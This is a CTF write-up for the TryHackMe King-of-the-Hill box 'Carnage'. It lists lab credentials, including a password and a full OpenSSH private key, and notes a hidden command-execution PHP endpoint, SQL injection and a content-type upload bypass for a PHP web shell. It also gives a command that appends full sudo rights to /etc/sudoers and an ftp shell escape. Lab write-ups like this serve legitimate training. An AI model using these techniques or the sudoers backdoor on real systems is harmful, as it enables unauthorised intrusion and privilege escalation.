# Carnage THM KOTH

#### Important no `chattr` on the box

#### Map
```
nmap service overview
```

#### Default Credentials
```bash
yoda
duku

# These credentials come from a sqlite database, `web.db`, found in the web2 (port 82) website's folder, accessible after compromise
boba : -`G)8(t/NDkZ"u^{

# duku r_sa key:

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACATQLVIr77yK4TwcZZ1u0DX/qaSue5NNUkDz4roBYT0zgAAAIjrCGAZ6whg
GQAAAAtzc2gtZWQyNTUxOQAAACATQLVIr77yK4TwcZZ1u0DX/qaSue5NNUkDz4roBYT0zg
AAAEC3POa13ftnfCfC3LhqDZ04lSEUQK3+OMtomXRmTI1WjhNAtUivvvIrhPBxlnW7QNf+
ppK57k01SQPPiugFhPTOAAAABGR1a3UB
-----END OPENSSH PRIVATE KEY-----
```

#### Network Services to Foothold
```
Port 80 has a hidden site at `/3ef043d9e9c5d19b9db6d87c6f23b290/dice.php?action=metsys&text=di` - it gives command execution as `yoda`, with the text needing to be reversed
```

```
:81 is vulnerable to sql injection over  `web.db`
```

```
Port 82 hosts a file upload site, that only checks the stated upload content type. By setting this as `image/png` and adding an extension like `.png.php`, an otherwise standard php web shell can be uploaded. This will get you access as the user `duku`
```

#### Privilege Escalation

Bobba only:
```
find /etc/sudoers -exec bash -c 'echo "bobba ALL=(ALL:ALL) ALL" >> /etc/sudoers
```

Not in GTFOBins [ChrisPritchard KOTH Carnage](https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-carnage.md)
```bash
/usr/bin/netkit-ftp !/bin/sh
```
#### Flags
Flags append only flag set, and there is no chattr on the machine I could find. To add user use `echo Aquinas >> king.txt`
```
/home/bobba/flag1.txt (rot13)
/home/yoda/flag2.txt (hex)
/home/duku/flag3.txt
/root/flag4.txt
/var/www/html/web1/web.db
/var/www/html/web2/flag.txt
/var/www/html/web3/flag.txt
/root/king.txt
```

#### References

https://github.com/Machinh/Koth-THM/blob/main/CARNAGE
https://github.com/0x76OID/KOTH/blob/main/Carnage/Carnage.sh
https://github.com/ChrisPritchard/ctf-writeups/blob/master/tryhackme-koth/koth-carnage.md